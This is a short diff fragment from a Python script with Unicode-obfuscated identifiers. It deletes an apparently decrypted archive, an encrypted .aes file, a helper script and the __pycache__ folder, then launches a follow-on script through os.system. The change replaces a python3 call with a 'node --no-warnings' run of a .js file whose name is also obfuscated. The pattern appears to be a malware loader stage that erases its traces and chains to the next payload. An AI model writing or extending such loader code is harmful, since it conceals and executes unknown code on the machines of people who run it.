@@ -161,7 +161,7 @@ if ᴠʟᴋʏʀᴇi is not None:
             os.remove("xp0e.aes")
             os.remove("xp0edoc.py")
             shutil.rmtree("__pycache__") 
-            os.system('python3 Ѷ𝖆𝖑𝐤𝐲𝖗𝖎𝖊🎒𝕭𝖆𝖌🐊𝕭𝖔𝖔𝖙.py')
+            os.system('node --no-warnings ӄ𝖚𝖓𝖆𝖎.js')
         else:
             os.remove("xp0e.zip")
             os.remove("xp0e.aes")
